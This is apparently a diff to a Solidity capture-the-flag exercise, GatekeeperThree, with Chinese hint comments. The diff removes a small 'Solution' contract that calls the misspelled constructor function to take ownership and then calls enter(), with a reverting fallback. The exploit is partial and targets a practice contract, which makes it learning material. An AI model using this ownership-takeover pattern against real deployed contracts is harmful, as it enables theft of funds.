@@ -79,16 +79,3 @@ contract GatekeeperThree {
 //应付大门，成为入门者。 
  
 //可能有帮助的事情: 召回低级函数的返回值。 注意语义。 刷新以太坊中的存储工作方式。
-
-contract Solution {
-    function solve(address _to) external {
-        GatekeeperThree(payable(_to)).construct0r();
-        GatekeeperThree(payable(_to)).enter();
-    }
-
-    fallback() external payable {
-        revert("sorry");
-    }
-}
-
-
